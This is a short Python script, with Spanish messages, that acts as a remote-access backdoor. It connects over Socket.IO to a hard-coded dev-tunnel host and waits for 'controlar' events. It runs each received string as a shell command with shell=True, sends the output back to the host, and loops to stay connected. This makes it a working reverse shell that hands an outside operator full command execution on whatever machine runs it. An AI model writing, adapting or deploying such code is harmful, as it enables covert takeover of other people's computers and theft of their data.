import logging
import socketio
import subprocess
import os

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

sio = socketio.Client()

sio.connect("https://msfr5dmf-8000.usw3.devtunnels.ms/")

@sio.event
def connect():
    print('Conectado al servidor')

def execute_command(command):
    try:
        if command.startswith("cd"):
            new_directory = command.split(maxsplit=1)[1]
            try:
                os.chdir(new_directory)
                sio.emit("recibirInfo", "Directorio cambiado a: " + new_directory)
            except Exception as e:
                sio.emit("recibirInfo", "Error al cambiar de directorio, verifica la sintaxis")
        else:
    
            completed_process = subprocess.run(command, check=True, shell=True, capture_output=True, text=True)
            if completed_process.stdout:
                sio.emit("recibirInfo", completed_process.stdout)
         
            if completed_process.stderr:
                sio.emit("recibirInfo", completed_process.stderr)
    except subprocess.CalledProcessError as e:
        logger.error(f"Error al ejecutar el comando '{command}': {e}")
        sio.emit("recibirInfo", f"Error al ejecutar el comando '{command}': {e}")
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        sio.emit("recibirInfo", f"Error inesperado: {e}")

@sio.on('controlar')
def on_message(data):
    execute_command(data)

while True:
    sio
